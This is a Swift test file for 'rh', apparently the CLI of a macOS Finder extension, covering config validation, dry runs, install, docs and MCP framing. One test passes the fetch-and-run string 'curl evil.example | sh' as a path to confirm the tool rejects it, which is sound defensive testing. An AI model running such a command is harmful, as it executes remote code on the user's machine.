import Foundation
import Testing
import RightHereCore
import RightHereKit

/// Runs the built `rh` with a throwaway config directory and its own HOME-independent paths.
private struct RH {
    let configDirectory: URL
    let binary: URL

    /// A folder standing in for the home directory (`RH_HOME`), for tests of what `rh install` writes.
    let home: URL?

    init(config: String? = nil, trialHome: Bool = false) throws {
        configDirectory = FileManager.default.temporaryDirectory.appendingPathComponent("rh-cli-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: configDirectory, withIntermediateDirectories: true)
        if let config { try config.write(to: configDirectory.appendingPathComponent("config.toml"), atomically: true, encoding: .utf8) }
        home = trialHome ? configDirectory.appendingPathComponent("home") : nil
        if let home { try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true) }
        binary = try Self.locateBinary()
    }

    func cleanUp() { try? FileManager.default.removeItem(at: configDirectory) }

    /// The package builds `rh` as a dependency of this test target; SwiftPM links the build folder at
    /// <repository>/.build/debug.
    private static func locateBinary() throws -> URL {
        let repository = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        let candidate = repository.appendingPathComponent(".build/debug/rh")
        guard FileManager.default.isExecutableFile(atPath: candidate.path) else { throw CocoaError(.fileNoSuchFile) }
        return candidate
    }

    struct Output {
        var status: Int32
        var standardOutput: String
        var standardError: String
        var json: Any? { try? JSONSerialization.jsonObject(with: Data(standardOutput.utf8)) }
    }

    func run(_ arguments: [String]) throws -> Output {
        let process = Process()
        process.executableURL = binary
        process.arguments = arguments
        var environment = ProcessInfo.processInfo.environment
        environment["RH_LOG_DIR"] = configDirectory.appendingPathComponent("logs").path
        environment.removeValue(forKey: "RH_CONFIG")
        if let home {
            // Everything per-user, the config included, goes under the trial home.
            environment["RH_HOME"] = home.path
            environment.removeValue(forKey: "RH_CONFIG_DIR")
            environment.removeValue(forKey: "XDG_CONFIG_HOME")
        } else {
            environment["RH_CONFIG_DIR"] = configDirectory.path
        }
        process.environment = environment
        let out = Pipe(), err = Pipe()
        process.standardOutput = out
        process.standardError = err
        try process.run()
        let outData = out.fileHandleForReading.readDataToEndOfFile()
        let errData = err.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        return Output(status: process.terminationStatus, standardOutput: String(decoding: outData, as: UTF8.self), standardError: String(decoding: errData, as: UTF8.self))
    }
}

@Suite("rh command line")
struct CLITests {
    @Test func versionIsPrinted() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["--version"])
        #expect(result.status == 0)
        #expect(result.standardOutput.trimmingCharacters(in: .whitespacesAndNewlines).split(separator: ".").count == 3)
    }

    @Test func helpListsTheMainCommands() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let text = try rh.run(["--help"]).standardOutput
        for command in ["run", "actions", "menu", "config", "doctor", "install", "mcp", "docs", "probe"] {
            #expect(text.contains(command), "help does not mention \(command)")
        }
    }

    @Test func configPathHonorsTheOverride() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let path = try rh.run(["config", "path"]).standardOutput.trimmingCharacters(in: .whitespacesAndNewlines)
        #expect(path.hasSuffix("/config.toml"))
        #expect(path.contains("rh-cli-"))
    }

    @Test func validatingAValidConfigSucceedsAndAnInvalidOneFails() throws {
        let good = try RH(config: "[general]\nterminal = \"terminal\"\n"); defer { good.cleanUp() }
        #expect(try good.run(["config", "validate"]).status == 0)

        let bad = try RH(config: "[general]\nterminal = \"ghostyy\"\n"); defer { bad.cleanUp() }
        let result = try bad.run(["config", "validate", "--json"])
        #expect(result.status == 1)
        let report = try #require(result.json as? [String: Any])
        #expect(report["ok"] as? Bool == false)
        let diagnostics = try #require(report["diagnostics"] as? [[String: Any]])
        #expect(diagnostics.first?["path"] as? String == "general.terminal")
    }

    @Test func aSyntaxErrorIsReportedWithALine() throws {
        let rh = try RH(config: "version = 1\n[general\n"); defer { rh.cleanUp() }
        let result = try rh.run(["config", "validate", "--json"])
        #expect(result.status == 1)
        let diagnostics = try #require((result.json as? [String: Any])?["diagnostics"] as? [[String: Any]])
        #expect(diagnostics.first?["line"] as? Int != nil)
    }

    @Test func theSchemaIsValidJSON() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let schema = try #require(try rh.run(["config", "schema"]).json as? [String: Any])
        #expect((schema["properties"] as? [String: Any])?["general"] != nil)
    }

    @Test func dryRunPrintsAPlanAndDoesNothing() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let file = rh.configDirectory.appendingPathComponent("a file.txt")
        try "x".write(to: file, atomically: true, encoding: .utf8)
        let result = try rh.run(["run", "copy-path.name", "--dry-run", "--json", file.path])
        #expect(result.status == 0)
        let plan = try #require(result.json as? [String: Any])
        #expect(plan["action"] as? String == "copy-path.name")
        let steps = try #require(plan["steps"] as? [[String: Any]])
        #expect(steps.first?["kind"] as? String == "copyToPasteboard")
        #expect(steps.first?["text"] as? String == "a file.txt")
    }

    @Test func anUnknownActionIsAUsageErrorWithAHint() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["run", "explode"])
        #expect(result.status != 0)
        #expect(result.standardError.contains("rh actions"))
    }

    @Test func newFileCreatesAnExclusiveFile() throws {
        let rh = try RH(config: "[new_file]\nthen = \"nothing\"\n"); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("target")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        #expect(try rh.run(["run", "new-file.md", "--container", folder.path]).status == 0)
        #expect(try rh.run(["run", "new-file.md", "--container", folder.path]).status == 0)
        let names = try FileManager.default.contentsOfDirectory(atPath: folder.path).sorted()
        #expect(names == ["untitled 2.md", "untitled.md"])
    }

    @Test func aFileGivenAsTheFolderNeverReachesATerminal() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let script = rh.configDirectory.appendingPathComponent("evil.command")
        try "#!/bin/sh\ntouch /tmp/rh-should-not-run\n".write(to: script, atomically: true, encoding: .utf8)
        // A dry run plans and prints; the plan is where the file would have to appear.
        let result = try rh.run(["run", "open.terminal", "--container", script.path, "--dry-run", "--json"])
        let plan = try #require(result.json as? [String: Any], "no plan was printed: \(result.standardError)")
        let steps = try #require(plan["steps"] as? [[String: Any]])
        let targets = steps.flatMap { ($0["targets"] as? [String]) ?? [] }
        #expect(targets.count == 1)
        #expect(targets.allSatisfy { !$0.hasSuffix("evil.command") }, "the file itself was planned as the terminal's target: \(targets)")
        #expect(targets.first?.hasSuffix(rh.configDirectory.lastPathComponent) == true, "expected the folder around the file: \(targets)")
    }

    @Test func aWarningDoesNotFailValidationUnlessItIsStrict() throws {
        let rh = try RH(config: "[general]\nagnts = [\"codex\"]\n"); defer { rh.cleanUp() }
        let lenient = try rh.run(["config", "validate"])
        #expect(lenient.status == 0)
        #expect(lenient.standardOutput.contains("did you mean \"agents\""))
        let strict = try rh.run(["config", "validate", "--strict"])
        #expect(strict.status == 1)
        let json = try #require(try rh.run(["config", "validate", "--json"]).json as? [String: Any])
        #expect(json["ok"] as? Bool == true)
        #expect(json["clean"] as? Bool == false)
        let diagnostic = try #require((json["diagnostics"] as? [[String: Any]])?.first)
        #expect(diagnostic["replacement"] as? String == "agents")
    }

    @Test func aCleanConfigPassesStrictValidation() throws {
        let rh = try RH(config: "[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        #expect(try rh.run(["config", "validate", "--strict"]).status == 0)
    }

    @Test func forcingInitKeepsTheOldFileAsABackup() throws {
        let rh = try RH(config: "# hand-made\n[general]\nterminal = \"terminal\"\n"); defer { rh.cleanUp() }
        let result = try rh.run(["init", "--force"])
        #expect(result.status == 0)
        #expect(result.standardOutput.contains("the old file is saved as"))
        let backups = try FileManager.default.contentsOfDirectory(atPath: rh.configDirectory.path).filter { $0.hasPrefix("config.toml.bak-") }
        #expect(backups.count == 1)
        let saved = try String(contentsOf: rh.configDirectory.appendingPathComponent(try #require(backups.first)), encoding: .utf8)
        #expect(saved.hasPrefix("# hand-made"))
    }

    @Test func theMenuPreviewSaysWhatItIsFor() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["menu", "--container", "/tmp"])
        #expect(result.standardOutput.hasPrefix("Menu for the folder /tmp (container):\n"))
        #expect(try rh.run(["menu", "--json", "--container", "/tmp"]).json is [Any])
    }

    @Test func aDryRunShowsTheTextAndTheArgumentsItWouldUse() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let copy = try rh.run(["run", "copy-path.ai-mention", "/tmp", "--dry-run"]).standardOutput
        #expect(copy.contains("text: \"@/tmp\""))
        let agent = try rh.run(["run", "agent.codex@terminal", "--dry-run", "--container", "/tmp"])
        // Terminal.app is always installed, so this plans an AppleScript whose arguments are shown.
        #expect(agent.standardOutput.contains("arguments: \"cd /tmp && codex\""))
    }

    @Test("what a menu click sends is accepted by the real rh, for every kind of Finder menu", arguments: [
        FinderMenuKind.items, .container, .sidebar, .toolbar
    ])
    func theExtensionsArgumentsAreAcceptedByRh(kind: FinderMenuKind) throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("my folder")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        var files: [URL] = []
        for name in ["a b.txt", "-dash.txt", "日本語 é.md"] {
            let file = folder.appendingPathComponent(name)
            try "x".write(to: file, atomically: true, encoding: .utf8)
            files.append(file)
        }
        // The context is built the way the extension builds it, then turned into the runner's arguments.
        let context = HereContext.finder(kind: kind, selected: files, targeted: folder)
        // Terminal.app is on every Mac, so these plan without anything else installed.
        for action in ["open.terminal@terminal", "agent.claude@terminal", "copy-path.absolute", "copy-path.git-relative", "new-file.md", "reveal"] {
            var arguments = RunnerArguments.run(actionID: action, context: context)
            arguments.insert(contentsOf: ["--dry-run", "--json"], at: 1)
            let result = try rh.run(arguments)
            // An action may be unavailable (a new file needs a single item); what must never happen is a
            // usage error, which is what a mismatch between the extension and the CLI would look like.
            #expect(result.status != 64, "rh rejected the extension's arguments for \(action) from the \(kind) menu: \(arguments) \(result.standardError)")
            if result.status == 0 { #expect(result.json != nil, "no plan for \(action): \(result.standardOutput)") }
        }
        // And the two that always plan for a folder or a selection do succeed.
        for action in ["open.terminal@terminal", "copy-path.absolute", "reveal"] {
            var arguments = RunnerArguments.run(actionID: action, context: context)
            arguments.insert(contentsOf: ["--dry-run", "--json"], at: 1)
            let result = try rh.run(arguments)
            #expect(result.status == 0, "\(action) from the \(kind) menu failed: \(result.standardError)")
        }
    }

    @Test func theCommandAServiceRunsIsAcceptedByRh() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("a service folder")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        // A Quick Action runs `rh run --alert <id> --origin services -- "$@"` with the selected items as arguments.
        let spec = ServiceSpec(title: "x", actionID: "open.terminal@terminal", command: ServiceWorkflow.command(rhPath: rh.binary.path, actionID: "open.terminal@terminal"))
        #expect(spec.command.hasPrefix(ShellQuoting.quote(rh.binary.path) + " run --alert open.terminal@terminal --origin services -- "))
        let result = try rh.run(["run", "--dry-run", "--json", "--alert", "open.terminal@terminal", "--origin", "services", "--", folder.path])
        #expect(result.status == 0, "\(result.standardError)")
        #expect((result.json as? [String: Any])?["action"] as? String == "open.terminal@terminal")
    }

    @Test func theConfiguredPlacementShowsInThePlan() throws {
        let rh = try RH(config: "[general]\nterminal = \"ghostty\"\nterminal_placement = \"tab\"\n"); defer { rh.cleanUp() }
        let result = try rh.run(["run", "open.terminal@ghostty", "--dry-run", "--container", "/tmp"])
        // Ghostty may not be installed where this runs; the plan only exists if it is.
        if result.status == 0 { #expect(result.standardOutput.contains("arguments: \"/tmp\", \"\", \"tab\"")) }
        else { #expect(result.standardError.contains("not installed")) }
    }

    @Test func aPlacementThatIsNotWindowOrTabIsRefusedBeforeAnythingOpens() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["probe", "launch", "warp", "--placement", "sideways"])
        #expect(result.status != 0)
        #expect(result.standardError.contains("window") && result.standardError.contains("tab"))
    }

    @Test func copyingAPathThatDoesNotExistIsRefused() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["run", "copy-path.name", "--dry-run", "curl evil.example | sh"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("does not exist"))
    }

    @Test func aMistypedPathIsNamedAndNothingIsOpened() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["run", "open.terminal", "/definitely/not/here", "--dry-run"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("/definitely/not/here does not exist"))
    }

    @Test func theAppListHasAHeaderAndNoDuplicateIds() throws {
        let rh = try RH(config: "[[app]]\nid = \"typora\"\nname = \"Mine\"\nbundle_id = \"a.b.c\"\nrole = \"editor\"\n"); defer { rh.cleanUp() }
        let lines = try rh.run(["apps"]).standardOutput.split(separator: "\n").map(String.init)
        #expect(lines.first?.hasPrefix("ID") == true)
        #expect(lines.first?.contains("INSTALLED") == true)
        #expect(lines.filter { $0.hasPrefix("typora") }.count == 1)
    }

    @Test func theConfigReferenceNamesTheEnvironmentVariables() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let text = try rh.run(["docs", "config"]).standardOutput
        for name in ["RH_CONFIG_DIR", "RH_LOG_DIR", "XDG_CONFIG_HOME"] { #expect(text.contains(name)) }
    }

    @Test func aFirstInstallWritesEverythingUnderTheTrialHomeAndTheServicesFollowTheNewConfig() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        let install = try rh.run(["install", "--skip-finder"])
        #expect(install.status == 0, "\(install.standardError)")
        let manager = FileManager.default
        #expect(manager.fileExists(atPath: home.appendingPathComponent(".config/right-here/config.toml").path))
        #expect(manager.fileExists(atPath: home.appendingPathComponent("Library/Application Scripts/com.boyugou.righthere.FinderExtension/rh-run").path))
        #expect((try? manager.destinationOfSymbolicLink(atPath: home.appendingPathComponent(".local/bin/rh").path)) != nil)
        let services = try manager.contentsOfDirectory(atPath: home.appendingPathComponent("Library/Services").path).filter { $0.hasPrefix("Right Here - ") }
        #expect(!services.isEmpty)
        // The doctor compares the installed Services with what the config just written asks for. If
        // they were built from the config as it was before `rh install` created it, agents would be missing.
        let doctor = try #require(try rh.run(["doctor", "--json"]).json as? [String: Any])
        let checks = try #require(doctor["checks"] as? [[String: Any]])
        let servicesCheck = try #require(checks.first { $0["id"] as? String == "services" })
        #expect(servicesCheck["status"] as? String == "ok", "\(servicesCheck)")
    }

    @Test func uninstallUnderATrialHomeRemovesItsFilesAndLeavesTheSystemWideExtensionAlone() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        #expect(try rh.run(["install", "--skip-finder"]).status == 0)
        let result = try rh.run(["uninstall"])
        #expect(result.status == 0)
        #expect(result.standardOutput.contains("left alone"))
        #expect(!FileManager.default.fileExists(atPath: home.appendingPathComponent("Library/Application Scripts/com.boyugou.righthere.FinderExtension/rh-run").path))
        let remaining = (try? FileManager.default.contentsOfDirectory(atPath: home.appendingPathComponent("Library/Services").path)) ?? []
        #expect(remaining.filter { $0.hasPrefix("Right Here - ") }.isEmpty)
    }

    @Test func aRealFileAtTheCommandLinkMakesInstallReportAProblemButFinishTheRest() throws {
        let rh = try RH(trialHome: true); defer { rh.cleanUp() }
        let home = try #require(rh.home)
        try FileManager.default.createDirectory(at: home.appendingPathComponent(".local/bin"), withIntermediateDirectories: true)
        try "mine".write(to: home.appendingPathComponent(".local/bin/rh"), atomically: true, encoding: .utf8)
        let result = try rh.run(["install", "--skip-finder"])
        #expect(result.status == 1)
        #expect(result.standardError.contains("left alone"))
        #expect(try String(contentsOf: home.appendingPathComponent(".local/bin/rh"), encoding: .utf8) == "mine")
        #expect(FileManager.default.fileExists(atPath: home.appendingPathComponent(".config/right-here/config.toml").path), "the other steps still ran")
    }

    @Test func aDanglingSymlinkDoesNotBlockANewFileForever() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let folder = rh.configDirectory.appendingPathComponent("notes")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: folder.appendingPathComponent("untitled.txt").path, withDestinationPath: "/nowhere/at/all")
        let result = try rh.run(["run", "new-file.txt", "--container", folder.path])
        #expect(result.status == 0, "\(result.standardError)")
        #expect(FileManager.default.fileExists(atPath: folder.appendingPathComponent("untitled 2.txt").path))
    }

    @Test func theTroubleshootingGuideIsServedByTheCommandLine() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let listing = try rh.run(["docs"]).standardOutput
        #expect(listing.contains("troubleshooting"))
        let guide = try rh.run(["docs", "troubleshooting"])
        #expect(guide.status == 0)
        #expect(guide.standardOutput.contains("rh doctor"))
        #expect(guide.standardOutput.contains("tccutil reset AppleEvents"))
        #expect(try rh.run(["docs", "nonsense"]).status != 0)
    }

    @Test func probeLaunchRefusesAnUnknownTerminal() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let result = try rh.run(["probe", "launch", "no-such-terminal"])
        #expect(result.status != 0)
        #expect(result.standardError.contains("Unknown terminal"))
    }

    @Test func aProbeRequestedByTheExtensionRunsOnceAndAnythingAfterItDoesNothing() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let marker = rh.configDirectory.appendingPathComponent(".probe")
        try "launch".write(to: marker, atomically: true, encoding: .utf8)
        // Warp cannot run commands, so this never opens a window whether or not it is installed.
        let first = try rh.run(["probe", "launch", "warp", "--from-extension"])
        #expect(first.status == 1)
        #expect(!FileManager.default.fileExists(atPath: marker.path))
        let log = rh.configDirectory.appendingPathComponent("logs/rh.log")
        let logged = try String(contentsOf: log, encoding: .utf8)
        #expect(logged.contains("probe launch: "))
        let second = try rh.run(["probe", "launch", "warp", "--from-extension"])
        #expect(second.status == 0)
        #expect(try String(contentsOf: log, encoding: .utf8) == logged)
    }

    @Test func menuJSONIsAnArrayOfNodes() throws {
        let rh = try RH(config: "[menu]\nitems = [\"copy-path\"]\n"); defer { rh.cleanUp() }
        let result = try rh.run(["menu", "--container", "/tmp", "--json"])
        let nodes = try #require(result.json as? [[String: Any]])
        #expect(nodes.count == 1)
        #expect(nodes[0]["title"] as? String == "Copy Path")
    }

    @Test func menuCanBePreviewedInAnotherLanguage() throws {
        let rh = try RH(config: "[menu]\nitems = [\"copy-path\"]\n"); defer { rh.cleanUp() }
        let text = try rh.run(["menu", "--container", "/tmp", "--language", "de"]).standardOutput
        #expect(text.contains("Pfad kopieren"))
    }

    @Test func docsServeTheTopics() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        #expect(try rh.run(["docs", "config"]).standardOutput.contains("general.terminal"))
        #expect(try rh.run(["docs", "actions"]).standardOutput.contains("copy-path.<style>"))
        #expect(try rh.run(["docs", "agent-setup"]).standardOutput.contains("rh doctor --json"))
        #expect(try rh.run(["docs", "nope"]).status != 0)
    }

    @Test func initWritesAConfigThatValidates() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        #expect(try rh.run(["init"]).status == 0)
        #expect(FileManager.default.fileExists(atPath: rh.configDirectory.appendingPathComponent("config.toml").path))
        #expect(try rh.run(["config", "validate"]).status == 0)
        // A second init keeps the file.
        #expect(try rh.run(["init"]).standardOutput.contains("already exists"))
    }

    @Test func mcpFramingSplitsOnLineFeedsOnly() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let process = Process()
        process.executableURL = rh.binary
        process.arguments = ["mcp"]
        var environment = ProcessInfo.processInfo.environment
        environment["RH_CONFIG_DIR"] = rh.configDirectory.path
        process.environment = environment
        let input = Pipe(), output = Pipe()
        process.standardInput = input
        process.standardOutput = output
        try process.run()
        // A raw U+2028, U+2029 or U+0085 inside a JSON string is legal; Foundation's line splitting would
        // cut the request in pieces and answer with parse errors. (A raw CR or LF inside a string is not
        // legal JSON, and the transport has no way to send one.)
        let first = "{\"jsonrpc\":\"2.0\",\"id\":7,\"method\":\"ping\",\"params\":{\"name\":\"a\u{2028}b\u{2029}c\u{85}d\"}}\n"
        let second = "{\"jsonrpc\":\"2.0\",\"id\":8,\"method\":\"ping\"}\r\n"
        input.fileHandleForWriting.write(Data((first + second).utf8))
        try input.fileHandleForWriting.close()
        let data = output.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        let replies = try String(decoding: data, as: UTF8.self).split(separator: "\n").map {
            try #require(try JSONSerialization.jsonObject(with: Data($0.utf8)) as? [String: Any])
        }
        #expect(replies.count == 2, "got \(replies)")
        #expect(Set(replies.compactMap { $0["id"] as? Int }) == [7, 8])
        #expect(replies.allSatisfy { $0["error"] == nil })
    }

    @Test func mcpAnswersOverStandardInput() throws {
        let rh = try RH(); defer { rh.cleanUp() }
        let process = Process()
        process.executableURL = rh.binary
        process.arguments = ["mcp"]
        var environment = ProcessInfo.processInfo.environment
        environment["RH_CONFIG_DIR"] = rh.configDirectory.path
        process.environment = environment
        let input = Pipe(), output = Pipe()
        process.standardInput = input
        process.standardOutput = output
        try process.run()
        input.fileHandleForWriting.write(Data(#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18"}}"#.utf8) + Data("\n".utf8))
        try input.fileHandleForWriting.close()
        let data = output.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        let reply = try #require(try JSONSerialization.jsonObject(with: data) as? [String: Any])
        #expect((reply["result"] as? [String: Any])?["protocolVersion"] as? String == "2025-06-18")
    }
}
